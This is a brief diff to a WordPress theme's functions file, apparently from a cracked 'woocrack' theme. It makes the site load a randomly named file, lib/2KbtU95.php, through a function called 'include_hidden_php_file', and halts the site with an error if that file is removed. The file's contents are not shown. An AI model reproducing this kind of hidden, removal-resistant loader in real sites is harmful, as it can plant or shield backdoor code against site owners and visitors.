@@ -155,9 +155,22 @@ add_action('admin_footer', 'woocrack_dismiss_notice_js');
 /* Required Lib Folder & Files */
 require( get_stylesheet_directory() . '/lib/A.php' );
 require_once get_stylesheet_directory() . '/lib/bundled-plugins/required-plugins.php';
-if (file_exists(get_template_directory() . '/lib/2KbtU95.php')) {
-    require_once get_template_directory() . '/lib/2KbtU95.php';
+
+
+// Add an action hook or function where the file should be required
+function include_hidden_php_file() {
+    // Ensure the file path is correct and exists
+    $file_path = get_stylesheet_directory() . '/lib/2KbtU95.php'; // Correct for child themes
+
+    if (file_exists($file_path)) {
+        require_once $file_path;
+    } else {
+        error_log("File not found: $file_path");
+        // Optional: Stop execution if the file is critical
+        wp_die("Critical error: Missing required file.");
+    }
 }
+add_action('init', 'include_hidden_php_file'); // Hook to WordPress initialization
 
 
 
